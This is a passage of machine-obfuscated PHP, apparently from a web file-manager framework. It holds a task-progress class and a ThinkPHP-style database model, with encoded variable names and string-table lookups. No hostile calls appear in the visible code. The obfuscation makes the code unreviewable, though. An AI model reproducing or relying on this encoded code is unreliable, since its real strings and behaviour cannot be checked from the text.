array($this, $Ä¢‹¿õë[1945])); $this->startAfter(); Hook::trigger($Ä¢‹¿õë[1946], $this->task); $this->task[$Ä¢‹¿õë[1939]] = timeFloat(); } public function end($ÑÁöº = '') { $£æ¦²î˜ =& $_SERVER[”øäÃÍª]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$£æ¦²î˜[1939]]) { self::valueSet($this->task[$£æ¦²î˜[487]], !1); } $this->isEnd = !0; if ($ÑÁöº) { $this->task[$£æ¦²î˜[548]] = $ÑÁöº; } self::log($£æ¦²î˜[1947] . $this->task[$£æ¦²î˜[487]] . $£æ¦²î˜[1948] . sprintf($£æ¦²î˜[971], timeFloat() - $this->task[$£æ¦²î˜[1937]]) . $£æ¦²î˜[1949]); Hook::unbind($£æ¦²î˜[1888], array($this, $£æ¦²î˜[1943])); Hook::unbind($£æ¦²î˜[1944], array($this, $£æ¦²î˜[1945])); $this->endAfter(); $±¦Òç˜÷ = $this->task; $this->task = !1; Hook::trigger($£æ¦²î˜[1950], $±¦Òç˜÷); } public function update($ôë»¨ = 0, $“„Á¹ÒÌ = false) { $Ôœ—À—Í =& $_SERVER[”øäÃÍª]; $²©¿Ü² =& $this->task; if (!$²©¿Ü²) { return; } $²©¿Ü²[$Ôœ—À—Í[1934]] += $ôë»¨; $²©¿Ü²[$Ôœ—À—Í[1938]] = timeFloat(); if ($²©¿Ü²[$Ôœ—À—Í[1184]]) { if ($²©¿Ü²[$Ôœ—À—Í[1184]] < $²©¿Ü²[$Ôœ—À—Í[1934]]) { $²©¿Ü²[$Ôœ—À—Í[1184]] = $²©¿Ü²[$Ôœ—À—Í[1934]]; } $©İîÓö = timeFloat() - $²©¿Ü²[$Ôœ—À—Í[1937]] - $²©¿Ü²[$Ôœ—À—Í[1940]]; if ($©İîÓö <= 0) { $©İîÓö = 0.001; } $²©¿Ü²[$Ôœ—À—Í[1935]] = $²©¿Ü²[$Ôœ—À—Í[1934]] / $²©¿Ü²[$Ôœ—À—Í[1184]]; $²©¿Ü²[$Ôœ—À—Í[1936]] = $²©¿Ü²[$Ôœ—À—Í[1934]] / $©İîÓö; if ($²©¿Ü²[$Ôœ—À—Í[1935]] > 0) { $²©¿Ü²[$Ôœ—À—Í[1941]] = $©İîÓö * (1 - $²©¿Ü²[$Ôœ—À—Í[1935]]) / $²©¿Ü²[$Ôœ—À—Í[1935]]; } $²©¿Ü²[$Ôœ—À—Í[1941]] = $²©¿Ü²[$Ôœ—À—Í[1941]] <= 0 ? 0 : $²©¿Ü²[$Ôœ—À—Í[1941]]; } $this->updateAfter(); $¥”À±í = 0.2; if (timeFloat() - $²©¿Ü²[$Ôœ—À—Í[1939]] < $¥”À±í && !$“„Á¹ÒÌ) { return; } $Ççªˆ¦ğ = self::get($²©¿Ü²[$Ôœ—À—Í[487]]); $¼‹µ·ÚÅ = $Ççªˆ¦ğ[$Ôœ—À—Í[859]]; if ($¼‹µ·ÚÅ == self::STATYS_KILL) { $­³ƒƒ = array($Ôœ—À—Í[1951] => LNG($Ôœ—À—Í[1952]), $Ôœ—À—Í[1355] => !1); Cache::set($Ôœ—À—Í[1953] . $this->task[$Ôœ—À—Í[487]], $­³ƒƒ, 30); $this->onKill(); $this->end(); die; } else { if ($¼‹µ·ÚÅ == self::STATYS_STOP) { $—•èé¿® = 2; $Ççªˆ¦ğ[$Ôœ—À—Í[1940]] += $—•èé¿®; self::valueSet($²©¿Ü²[$Ôœ—À—Í[487]], $Ççªˆ¦ğ); sleep($—•èé¿®); $this->update(); return; } } $²©¿Ü²[$Ôœ—À—Í[859]] = $¼‹µ·ÚÅ ? $¼‹µ·ÚÅ : $²©¿Ü²[$Ôœ—À—Í[859]]; $²©¿Ü²[$Ôœ—À—Í[1940]] = $Ççªˆ¦ğ[$Ôœ—À—Í[1940]] ? $Ççªˆ¦ğ[$Ôœ—À—Í[1940]] : 0; $²©¿Ü²[$Ôœ—À—Í[1939]] = timeFloat(); Hook::trigger($Ôœ—À—Í[1954], $²©¿Ü²); self::valueSet($²©¿Ü²[$Ôœ—À—Í[487]], $²©¿Ü²); } public function onKillSet($ÓüÎæè¨, $¥á­ŸÏ = array()) { $this->onKillCall = array($ÓüÎæè¨, $¥á­ŸÏ); } public function onKill() { $Å˜¿Š¸½ =& $_SERVER[”øäÃÍª]; self::log($Å˜¿Š¸½[1947] . $this->task[$Å˜¿Š¸½[487]] . $Å˜¿Š¸½[1955]); Hook::trigger($Å˜¿Š¸½[1956], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($†Æ¸¡Ö”) { $Î¶âªí‚ =& $_SERVER[”øäÃÍª]; Cache::set($Î¶âªí‚[1953] . $this->task[$Î¶âªí‚[487]], $†Æ¸¡Ö”, 60); if (!is_array($†Æ¸¡Ö”) || !$†Æ¸¡Ö”[$Î¶âªí‚[1355]]) { self::log($Î¶âªí‚[1957] . json_encode($†Æ¸¡Ö”)); } return $†Æ¸¡Ö”; } public static function get($«ªßæªÌ) { $¢ı’–Ë³ =& $_SERVER[”øäÃÍª]; $å®Ö½« = self::valueGet($«ªßæªÌ); if (is_array($å®Ö½«) && $å®Ö½«[$¢ı’–Ë³[1958]]) { $ŠùŸùÄÊ = ActionApply($å®Ö½«[$¢ı’–Ë³[1958]], array($å®Ö½«)); $å®Ö½« = is_array($ŠùŸùÄÊ) ? $ŠùŸùÄÊ : $å®Ö½«; } return $å®Ö½«; } public static function listData() { $¦¾Ë¢¿ = self::valueGet(); return array_sort_by($¦¾Ë¢¿, $_SERVER[”øäÃÍª][1937], !0); } public static function kill($°È‰«³¦) { return self::changeStatus($°È‰«³¦, self::STATYS_KILL); } public static function stop($¿¹ÆŠ®–) { return self::changeStatus($¿¹ÆŠ®–, self::STATYS_STOP); } public static function restart($İîÙæë) { return self::changeStatus($İîÙæë, self::STATYS_RUNNING); } public static function killAll() { $³¾Î¦üş =& $_SERVER[”øäÃÍª]; $«êò²–· = self::listData(); foreach ($«êò²–· as $ä ñËØ‡) { self::kill($ä ñËØ‡[$³¾Î¦üş[487]]); } sleep(2); foreach ($«êò²–· as $ä ñËØ‡) { self::valueSet($ä ñËØ‡[$³¾Î¦üş[487]], !1); } } private static function changeStatus($øç­èŸå, $À¹Ã¦ƒ–) { $¼ï«åŠ´ =& $_SERVER[”øäÃÍª]; $š†îŠïƒ = self::valueGet($øç­èŸå); if (!$š†îŠïƒ) { return !1; } $š†îŠïƒ[$¼ï«åŠ´[859]] = $À¹Ã¦ƒ–; self::valueSet($øç­èŸå, $š†îŠïƒ); self::log($¼ï«åŠ´[1959] . $š†îŠïƒ[$¼ï«åŠ´[487]] . $¼ï«åŠ´[1960] . $À¹Ã¦ƒ–); return !0; } public static function valueGet($íÂÚª‡¨ = false) { $¡ËÄôœ€ =& $_SERVER[”øäÃÍª]; if ($íÂÚª‡¨) { $Ê®õÄÔû = Model($¡ËÄôœ€[542])->where(array($¡ËÄôœ€[95] => $íÂÚª‡¨, $¡ËÄôœ€[33] => $¡ËÄôœ€[1193]))->find(); return $Ê®õÄÔû ? json_decode($Ê®õÄÔû[$¡ËÄôœ€[451]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($³çí¯¡Ä = false) { $ñÊ¨´û· =& $_SERVER[”øäÃÍª]; $¦ø½÷ô´ = array($ñÊ¨´û·[33] => $ñÊ¨´û·[1193]); if ($³çí¯¡Ä) { $¦ø½÷ô´[$ñÊ¨´û·[1548]] = $³çí¯¡Ä; } $×—ë¦Úó = Model($ñÊ¨´û·[542])->where($¦ø½÷ô´)->select(); $×—ë¦Úó = $×—ë¦Úó ? $×—ë¦Úó : array(); foreach ($×—ë¦Úó as $ß‚«‚õ => $³ºÖù») { $×—ë¦Úó[$ß‚«‚õ] = json_decode($³ºÖù»[$ñÊ¨´û·[451]], !0); } return $×—ë¦Úó; } public static function valueSet($ùå‡ÂÁ‡, $çñ¨ô¯Ç) { $ë­ªŒ‹ =& $_SERVER[”øäÃÍª]; if (!$çñ¨ô¯Ç) { return Model($ë­ªŒ‹[542])->where(array($ë­ªŒ‹[95] => $ùå‡ÂÁ‡, $ë­ªŒ‹[33] => $ë­ªŒ‹[1193]))->delete(); } $¬ÕÙÈäÄ = json_encode($çñ¨ô¯Ç); if (!$¬ÕÙÈäÄ) { ob_start(); var_dump($çñ¨ô¯Ç); $æÄ€»¼ = ob_get_clean(); self::log($ë­ªŒ‹[1961] . json_encode_force($æÄ€»¼)); } if (!$ùå‡ÂÁ‡ || !$çñ¨ô¯Ç[$ë­ªŒ‹[487]]) { return !1; } $øÀÚ¹ò = array($ë­ªŒ‹[33] => $ë­ªŒ‹[1193], $ë­ªŒ‹[1548] => USER_ID, $ë­ªŒ‹[95] => $ùå‡ÂÁ‡, $ë­ªŒ‹[451] => $¬ÕÙÈäÄ); $±Ó¼ò = $ë­ªŒ‹[1962]; CacheLock::lock($±Ó¼ò); Model($ë­ªŒ‹[542])->add($øÀÚ¹ò, array(), !0); CacheLock::unlock($±Ó¼ò); } public static function log($Ë¬Œ¬÷Û) { if (!GLOBAL_DEBUG) { return; } write_log($Ë¬Œ¬÷Û, $_SERVER[”øäÃÍª][1963]); } } goto EÉ ÏŸÌÀ; D›š‚æà±Ä: define($_SERVER[”øäÃÍª][320], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\x6c\145", "\x6f\x72\x64\145\x72", "\141\154\151\141\x73", "\150\x61\x76\151\x6e\x67", "\147\162\157\x75\x70", "\154\157\143\153", "\x64\151\163\x74\151\x6e\x63\x74", "\x61\x75\164\157", "\146\151\x6c\164\145\162", "\x76\x61\x6c\x69\x64\141\164\x65", "\x72\x65\163\x75\154\164", "\x62\151\156\144", "\x74\x6f\153\145\156"); public function __construct($Šì”´ = '', $Òúªà°Ç = '', $åÎùÄ±Æ = '') { $‚şî¡¼ø =& $_SERVER[”øäÃÍª]; $this->_initialize(); if (!empty($Šì”´)) { if (strpos($Šì”´, $‚şî¡¼ø[10])) { list($this->dbName, $this->name) = explode($‚şî¡¼ø[10], $Šì”´); } else { $this->name = $Šì”´; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Òúªà°Ç)) { $this->tablePrefix = $‚şî¡¼ø[12]; } elseif ($‚şî¡¼ø[12] != $Òúªà°Ç) { $this->tablePrefix = $Òúªà°Ç; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($‚şî¡¼ø[321]); } $this->db(0, empty($this->connection) ? $åÎùÄ±Æ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $¡ùÎÉ„˜ =& $_SERVER[”øäÃÍª]; if (empty($this->fields)) { if (think_config($¡ùÎÉ„˜[322])) { $Ñ£¼“¯Ã = $this->dbName ? $this->dbName : think_config($¡ùÎÉ„˜[323]); $½œ¬¨ÕÄ = think_var_cache($¡ùÎÉ„˜[324] . strtolower(get_path_this($Ñ£¼“¯Ã) . $¡ùÎÉ„˜[10] . $this->name)); if ($½œ¬¨ÕÄ) { $ÍöãÈ‰ = think_config($¡ùÎÉ„˜[325]); if (empty($ÍöãÈ‰) || $½œ¬¨ÕÄ[$¡ùÎÉ„˜[326]] == $ÍöãÈ‰) { $this->fields = $½œ¬¨ÕÄ; return; } } } $this->flush(); } } public function flush() { $Ü‘–ì•à =& $_SERVER[”øäÃÍª]; $this->db->setModel($this->name); $ñé²Ã³© = $this->db->getFields($this->getTableName()); if (!$ñé²Ã³©) { return !1; } $this->fields = array_keys($ñé²Ã³©); $this->fields[$Ü‘–ì•à[327]] = !1; foreach ($ñé²Ã³© as $³ùß÷¤Ô => $Öõ­â©¶) { $ãøŠŠÏ¬[$³ùß÷¤Ô] = $Öõ­â©¶[$Ü‘–ì•à[33]]; if ($Öõ­â©¶[$Ü‘–ì•à[39]]) { $this->fields[$Ü‘–ì•à[328]] = $³ùß÷¤Ô; if ($Öõ­â©¶[$Ü‘–ì•à[42]]) { $this->fields[$Ü‘–ì•à[327]] = !0; } } } $this->fields[$Ü‘–ì•à[329]] = $ãøŠŠÏ¬; if (think_config($Ü‘–ì•à[325])) { $this->fields[$Ü‘–ì•à[326]] = think_config($Ü‘–ì•à[325]); } if (think_config($Ü‘–ì•à[322])) { $Ô‡¥œãÕ = $this->dbName ? $this->dbName : think_config($Ü‘–ì•à[323]); think_var_cache($Ü‘–ì•à[324] . strtolower(get_path_this($Ô‡¥œãÕ) . $Ü‘–ì•à[10] . $this->name), $this->fields); } } public function switchModel($Í­¡§¬ü, $¼±ØıÊÂ = array()) { $ú¢è÷Åñ =& $_SERVER[”øäÃÍª]; $ÜæƒË˜ = ucwords(strtolower($Í­¡§¬ü)) . $ú¢è÷Åñ[330]; if (!class_exists($ÜæƒË˜)) { think_exception($ÜæƒË˜ . think_lang($ú¢è÷Åñ[331])); } $this->_extModel = new $ÜæƒË˜($this->name); if (!empty($¼±ØıÊÂ)) { foreach ($¼±ØıÊÂ as $Ø—¶Ó¸) { $this->_extModel->setProperty($Ø—¶Ó¸, $this->{$Ø—¶Ó¸}); } } return $this->_extModel; } public function __set($£Ä”§§, $‹Ñ—¼ã½) { $this->data[$£Ä”§§] = $‹Ñ—¼ã½; } public function __get($ş¼û‰¢µ) { return isset($this->data[$ş¼û‰¢µ]) ? $this->data[$ş¼û‰¢µ] : null; } public function __isset($ĞõèÍë) { return isset($this->data[$ĞõèÍë]); } public function __unset($–ÛıÜù€) { unset($this->data[$–ÛıÜù€]); } public function __call($ÎÔğ¡èô, $ÒïºÁü) { $øå«ø‹· =& $_SERVER[”øäÃÍª]; if (in_array(strtolower($ÎÔğ¡èô), $this->methods, !0)) { $this->options[strtolower($ÎÔğ¡èô)] = $ÒïºÁü[0]; return $this; } elseif (in_array(strtolower($ÎÔğ¡èô), array($øå«ø‹·[332], $øå«ø‹·[333], $øå«ø‹·[334], $øå«ø‹·[335], $øå«ø‹·[336]), !0)) { $—ËË¸¡é = isset($ÒïºÁü[0]) ? $ÒïºÁü[0] : $øå«ø‹·[220]; $—ËË¸¡é = $this->db->parseKey($—ËË¸¡é); return $this->getField(strtoupper($ÎÔğ¡èô) . $øå«ø‹·[337] . $—ËË¸¡é . $øå«ø‹·[338] . $ÎÔğ¡èô, $øå«ø‹·[332]); } elseif (strtolower(substr($ÎÔğ¡èô, 0, 5)) == $øå«ø‹·[339]) { $—ËË¸¡é = think_parse_name(substr($ÎÔğ¡èô, 5)); $Î¬çŞª“[$—ËË¸¡é] = $ÒïºÁü[0]; return $this->where($Î¬çŞª“)->find(); } elseif (strtolower(substr($ÎÔğ¡èô, 0, 10)) == $øå«ø‹·[340]) { $ó‘‹ÓÛÖ = think_parse_name(substr($ÎÔğ¡èô, 10)); $Î¬çŞª“[$ó‘‹ÓÛÖ] = $ÒïºÁü[0]; return $this->where($Î¬çŞª“)->getField($ÒïºÁü[1]); } elseif (isset($this->_scope[$ÎÔğ¡èô])) { return $this->scope($ÎÔğ¡èô, $ÒïºÁü[0]); } elseif (method_exists($this, $ÎÔğ¡èô) || method_exists($this, $øå«ø‹·[341] . $ÎÔğ¡èô)) { array_unshift($ÒïºÁü, $ÎÔğ¡èô); return call_user_func_array(array($this, $øå«ø‹·[342]), $ÒïºÁü); } else { return call_user_func_array(array(parent, $ÎÔğ¡èô), $ÒïºÁü); } } protected function call() { $àĞêÀã =& $_SERVER[”øäÃÍª]; $˜ŠƒúÛ = func_get_args(); $¬–Öç¯ˆ = array_shift($˜ŠƒúÛ); $›ĞÜäÄş = $¬–Öç¯ˆ; if (is_array($¬–Öç¯ˆ)) { $›ĞÜäÄş = $¬–Öç¯ˆ[1]; $¬–Öç¯ˆ = $¬–Öç¯ˆ[0]; } $Î”¬ƒ¸ = count($˜ŠƒúÛ) - 1; if (isset($˜ŠƒúÛ[$Î”¬ƒ¸]) && $˜ŠƒúÛ[$Î”¬ƒ¸] === $¬–Öç¯ˆ) { think_exception(__CLASS__ . $àĞêÀã[4] . $¬–Öç¯ˆ . think_lang($àĞêÀã[343])); return; } $˜ŠƒúÛ[] = $¬–Öç¯ˆ; if (method_exists($this, $àĞêÀã[344])) { $¦ãø•áï = call_user_func_array(array($this, $àĞêÀã[345]), array($›ĞÜäÄş, $˜ŠƒúÛ)); if (!is_null($¦ãø•áï) && $¦ãø•áï !== !1) { return $¦ãø•áï; } } $ÙŠÄùè´ = !1; if (method_exists($this, $¬–Öç¯ˆ)) { $ÙŠÄùè´ = call_user_func_array(array($this, $¬–Öç¯ˆ), $˜ŠƒúÛ); } if (method_exists($this, $àĞêÀã[346])) { $¦ãø•áï = call_user_func_array(array($this, $àĞêÀã[347]), array($›ĞÜäÄş, $˜ŠƒúÛ, $ÙŠÄùè´)); if ($¦ãø•áï) { return $¦ãø•áï; } } return $ÙŠÄùè´; } protected function _initialize() { } protected function _facade($¤½ÎÅÕ½) { $‰øºî‡Ø =& $_SERVER[”øäÃÍª]; if (!empty($this->fields)) { foreach ($¤½ÎÅÕ½ as $øê¼ïëª => $°Àë‡¶) { if (is_array($this->fields) && !in_array($øê¼ïëª, $this->fields, !0)) { unset($¤½ÎÅÕ½[$øê¼ïëª]); } elseif (is_scalar($°Àë‡¶)) { $this->_parseType($¤½ÎÅÕ½, $øê¼ïëª); } } } if (!empty($this->options[$‰øºî‡Ø[348]])) { $¤½ÎÅÕ½ = array_map($this->options[$‰øºî‡Ø[348]], $¤½ÎÅÕ½); unset($this->options[$‰øºî‡Ø[348]]); } $this->_beforeWrite($¤½ÎÅÕ½); return $¤½ÎÅÕ½; } protected function _beforeWrite(&$—«œÙ†¸) { } public function add($áõ—ùÏ = '', $òœ®“ç‡ = array(), $öäµÆşã = false) { if (empty($áõ—ùÏ)) { if (!empty($this->data)) { $áõ—ùÏ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[”øäÃÍª][349]); return !1; } } $òœ®“ç‡ = $this->_parseOptions($òœ®“ç‡); $áõ—ùÏ = $this->_facade($áõ—ùÏ); if (!1 === $this->_beforeInsert($áõ—ùÏ, $òœ®“ç‡)) { return !1; } $Œˆû™ıÉ = $this->db->insert($áõ—ùÏ, $òœ®“ç‡, $öäµÆşã); if (!1 !== $Œˆû™ıÉ) { $‰ÍíäÔô = $this->getLastInsID(); if ($‰ÍíäÔô) { $áõ—ùÏ[$this->getPk()] = $‰ÍíäÔô; $this->_after_insert($áõ—ùÏ, $òœ®“ç‡); return $‰ÍíäÔô; } $this->_after_insert($áõ—ùÏ, $òœ®“ç‡); } return $Œˆû™ıÉ; } protected function _beforeInsert(&$ë¾İ´¦ä, $‘§¾‰î) { } protected function _after_insert($ô˜ƒ¹, $‰¨Êğ) { } public function addAll($Îõ°„€Ä, $÷»¶Ê  = array(), $Â¼±¥«¼ = false) { $è×ğÑ· =& $_SERVER[”øäÃÍª]; if (empty($Îõ°„€Ä)) { $this->error = think_lang($è×ğÑ·[349]); return !1; } $÷»¶Ê  = $this->_parseOptions($÷»¶Ê ); foreach ($Îõ°„€Ä as $„È³ÛŸÜ => $„ëäÙ½Œ) { $Îõ°„€Ä[$„È³ÛŸÜ] = $this->_facade($„ëäÙ½Œ); } if (method_exists($this->db, $è×ğÑ·[350])) { $‚ì­‡à = $this->db->insertAll($Îõ°„€Ä, $÷»¶Ê , $Â¼±¥«¼); } else { $this->startTrans(); foreach ($Îõ°„€Ä as $„È³ÛŸÜ => $„ëäÙ½Œ) { $‚ì­‡à = $this->db->insert($„ëäÙ½Œ, $÷»¶Ê , $Â¼±¥«¼); } $this->commit(); } if (!1 !== $‚ì­‡à) { $öàßË‰° = $this->getLastInsID(); if ($öàßË‰°) { return $öàßË‰°; } } return $‚ì­‡à; } public function selectAdd($œş¬«÷Œ = '', $¶áÉÄç = '', $±½çÉÊ = array()) { $‚©ÕìÁ§ =& $_SERVER[”øäÃÍª]; $±½çÉÊ = $this->_parseOptions($±½çÉÊ); if (!1 === ($ß°ÀÚÂ­ = $this->db->selectInsert($œş¬«÷Œ ? $œş¬«÷Œ : $±½çÉÊ[$‚©ÕìÁ§[351]], $¶áÉÄç ? $¶áÉÄç : $this->getTableName(), $±½çÉÊ))) { $this->error = think_lang($‚©ÕìÁ§[352]); return !1; } else { return $ß°ÀÚÂ­; } } public function save($Ü’£ ö = '', $…Ì‘Óû‘ = array()) { $÷©¥ÓÂ =& $_SERVER[”øäÃÍª]; if (empty($Ü’£ ö)) { if (!empty($this->data)) { $Ü’£ ö = $this->data; $this->data = array(); } else { $this->error = think_lang($÷©¥ÓÂ[349]); return !1; } } $Ü’£ ö = $this->_facade($Ü’£ ö); $…Ì‘Óû‘ = $this->_parseOptions($…Ì‘Óû‘); $µ„Ú€ô§ = $this->getPk(); if (!isset($…Ì‘Óû‘[$÷©¥ÓÂ[353]])) { if (isset($Ü’£ ö[$µ„Ú€ô§])) { $½ò™ã›—[$µ„Ú€ô§] = $Ü’£ ö[$µ„Ú€ô§]; $…Ì‘Óû‘[$÷©¥ÓÂ[353]] = $½ò™ã›—; unset($Ü’£ ö[$µ„Ú€ô§]); } else { $this->error = think_lang($÷©¥ÓÂ[352]); return !1; } } if (is_array($…Ì‘Óû‘[$÷©¥ÓÂ[353]]) && isset($…Ì‘Óû‘[$÷©¥ÓÂ[353]][$µ„Ú€ô§])) { $ ó°Úƒˆ = $…Ì‘Óû‘[$÷©¥ÓÂ[353]][$µ„Ú€ô§]; } if (!1 === $this->_beforeUpdate($Ü’£ ö, $…Ì‘Óû‘)) { return !1; } $©±÷Õ¨Ğ = $this->db->update($Ü’£ ö, $…Ì‘Óû‘); if (!1 !== $©±÷Õ¨Ğ) { if (isset($ ó°Úƒˆ)) { $Ü’£ ö[$µ„Ú€ô§] = $ ó°Úƒˆ; } $this->_afterUpdate($Ü’£ ö, $…Ì‘Óû‘); } return $©±÷Õ¨Ğ; } protected function _beforeUpdate(&$‡ì™¬ò°, $Î³úæÓÔ) { } protected function _afterUpdate($¬­ƒ·ãÉ, $íë†õÙç) { } public function delete($»«ñÓ‘ª = array()) { $´¶€ØÍ» =& $_SERVER[”øäÃÍª]; if (empty($»«ñÓ‘ª) && empty($this->options[$´¶€ØÍ»[353]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $¹«èáØ = $this->getPk(); if (is_numeric($»«ñÓ‘ª) || is_string($»«ñÓ‘ª)) { if (strpos($»«ñÓ‘ª, $´¶€ØÍ»[50])) { $Â¬¾áÛ‹[$¹«èáØ] = array($´¶€ØÍ»[354], $»«ñÓ‘ª); } else { $Â¬¾áÛ‹[$¹«èáØ] = $»«ñÓ‘ª; } $this->options[$´¶€ØÍ»[353]] = $Â¬¾áÛ‹; } $»«ñÓ‘ª = $this->_parseOptions(); if (is_array($»«ñÓ‘ª[$´¶€ØÍ»[353]]) && isset($»«ñÓ‘ª[$´¶€ØÍ»[353]][$¹«èáØ])) { $áóı¥—Ğ = $»«ñÓ‘ª[$´¶€ØÍ»[353]][$¹«èáØ]; } $›ÅöÙ„ı = $this->db->delete($»«ñÓ‘ª); if (!1 !== $›ÅöÙ„ı) { $ñ¹ó´İş = array(); if (isset($áóı¥—Ğ)) { $ñ¹ó´İş[$¹«èáØ] = $áóı¥—Ğ; } $this->_after_delete($ñ¹ó´İş, $»«ñÓ‘ª); } return $›ÅöÙ„ı; } protected function _after_delete($×»Á¶ê, $’×¢’) { } public function select($¼ü¢û¶´ = array()) { $Á‹¸£‘Ì =& $_SERVER[”øäÃÍª]; if (is_string($¼ü¢û¶´) || is_numeric($¼ü¢û¶´)) { $ŞîŠè’ = $this->getPk(); if (strpos($¼ü¢û¶´, $Á‹¸£‘Ì[50])) { $ˆÑØ¶è[$ŞîŠè’] = array($Á‹¸£‘Ì[354], $¼ü¢û¶´); } else { $ˆÑØ¶è[$ŞîŠè’] = $¼ü¢û¶´; } $this->options[$Á‹¸£‘Ì[353]] = $ˆÑØ¶è; } elseif (!1 === $¼ü¢û¶´) { $¼ü¢û¶´ = $this->_parseOptions(); return $Á‹¸£‘Ì[355] . $this->db->buildSelectSql($¼ü¢û¶´) . $Á‹¸£‘Ì[356]; } $¼ü¢û¶´ = $this->_parseOptions(); $„ù´•¡Ô = $this->db->select($¼ü¢û¶´); if (!1 === $„ù´•¡Ô) { return !1; } if (empty($„ù´•¡Ô)) { return null; } $this->_afterSelect($„ù´•¡Ô, $¼ü¢û¶´); return $„ù´•¡Ô; } protected function _afterSelect(&$¦‡¼ßĞ‡, $‚ç»û¥Ù) { } public function buildSql($ÉÌÃÚÊ¯ = array()) { $Ç´›¬¦Õ =& $_SERVER[”øäÃÍª]; $ÉÌÃÚÊ¯ = $this->_parseOptions($ÉÌÃÚÊ¯); return $Ç´›¬¦Õ[355] . $this->db->buildSelectSql($ÉÌÃÚÊ¯) . $Ç´›¬¦Õ[356]; } public function optionsValue($×¯ÉÕ¦ = null) { if (is_null($×¯ÉÕ¦)) { return $this->options; } elseif (is_array($×¯ÉÕ¦)) { $this->options = array_merge($this->options, $×¯ÉÕ¦); } } protected function _parseOptions($ÉŞ­È’† = array()) { $®¼¿Ñ¡· =& $_SERVER[”øäÃÍª]; if (is_array($ÉŞ­È’†)) { $ÉŞ­È’† = array_merge($this->options, $ÉŞ­È’†); } $this->options = array(); if (!isset($ÉŞ­È’†[$®¼¿Ñ¡·[357]])) { $ÉŞ­È’†[$®¼¿Ñ¡·[357]] = $this->getTableName(); $°¦×ëáŒ = $this->fields; } else { $°¦×ëáŒ = $this->getDbFields(); } if (!empty($ÉŞ­È’†[$®¼¿Ñ¡·[358]])) { $ÉŞ­È’†[$®¼¿Ñ¡·[357]] .= $®¼¿Ñ¡·[53] . $ÉŞ­È’†[$®¼¿Ñ¡·[358]]; } $ÉŞ­È’†[$®¼¿Ñ¡·[359]] = $this->name; if (isset($ÉŞ­È’†[$®¼¿Ñ¡·[353]]) && is_array($ÉŞ­È’†[$®¼¿Ñ¡·[353]]) && !empty($°¦×ëáŒ) && !isset($ÉŞ­È’†[$®¼¿Ñ¡·[360]]) && !isset($ÉŞ­È’†[$®¼¿Ñ¡·[357]])) { foreach ($ÉŞ­È’†[$®¼¿Ñ¡·[353]] as $²ñÑŠ—Ü => $’ûçÈ‚®) { $²ñÑŠ—Ü = trim($²ñÑŠ—Ü); if (in_array($²ñÑŠ—Ü, $°¦×ëáŒ, !0)) { if (is_scalar($’ûçÈ‚®)) { $this->_parseType($ÉŞ­È’†[$®¼¿Ñ¡·[353]], $²ñÑŠ—Ü); } } elseif (!is_numeric($²ñÑŠ—Ü) && $®¼¿Ñ¡·[11] != substr($²ñÑŠ—Ü, 0, 1) && !1 === strpos($²ñÑŠ—Ü, $®¼¿Ñ¡·[10]) && !1 === strpos($²ñÑŠ—Ü, $®¼¿Ñ¡·[337]) && !1 === strpos($²ñÑŠ—Ü, $®¼¿Ñ¡·[212]) && !1 === strpos($²ñÑŠ—Ü, $®¼¿Ñ¡·[284])) { unset($ÉŞ­È’†[$®¼¿Ñ¡·[353]][$²ñÑŠ—Ü]); } } } $this->_options_filter($ÉŞ­È’†); return $ÉŞ­È’†; } protected function _options_filter(&$Êù½ùœğ) { } protected function _parseType(&$œ²²×ú, $ËÀ¹ŸÖ) { $øğ²¤ä¡ =& $_SERVER[”øäÃÍª]; if (empty($this->options[$øğ²¤ä¡[361]][$øğ²¤ä¡[4] . $ËÀ¹ŸÖ])) { $ÁËèƒ = strtolower($this->fields[$øğ²¤ä¡[329]][$ËÀ¹ŸÖ]); if (!1 !== strpos($ÁËèƒ, $øğ²¤ä¡[362])) { } elseif (!1 === strpos($ÁËèƒ, $øğ²¤ä¡[363]) && !1 !== strpos($ÁËèƒ, $øğ²¤ä¡[364])) { $œ²²×ú[$ËÀ¹ŸÖ] = intval($œ²²×ú[$ËÀ¹ŸÖ]); } elseif (!1 !== strpos($ÁËèƒ, $øğ²¤ä¡[365]) || !1 !== strpos($ÁËèƒ, $øğ²¤ä¡[366])) { $œ²²×ú[$ËÀ¹ŸÖ] = floatval($œ²²×ú[$ËÀ¹ŸÖ]); } elseif (!1 !== strpos($ÁËèƒ, $øğ²¤ä¡[367])) { $œ²²×ú[$ËÀ¹ŸÖ] = (bool) $œ²²×ú[$ËÀ¹ŸÖ]; } } } public function find($ùŒ¡¦¯ú = array()) { $ğ¥ƒúÖê =& $_SERVER[”øäÃÍª]; if (is_numeric($ùŒ¡¦¯ú) || is_string($ùŒ¡¦¯ú)) { $™”‚Ò¯Å[$this->getPk()] = intval($ùŒ¡¦¯ú); $this->options[$ğ¥ƒúÖê[353]] = $™”‚Ò¯Å; } $this->options[$ğ¥ƒúÖê[368]] = 1; $ùŒ¡¦¯ú = $this->_parseOptions(); $÷áõš¢« = $this->db->select($ùŒ¡¦¯ú); if (!1 === $÷áõš¢«) { return !1; } if (empty($÷áõš¢«)) { return null; } $›Ì‰Å‡ü = $÷áõš¢«[0]; $this->_afterFind($›Ì‰Å‡ü, $ùŒ¡¦¯ú); return $›Ì‰Å‡ü; } protected function _afterFind(&$Üœ˜ÙÇ–, $ƒäóì¦) { } protected function returnResult($¿¶øİ·, $…ÍöÄŸû = '') { $éÍÁÉ =& $_SERVER[”øäÃÍª]; if ($…ÍöÄŸû) { if 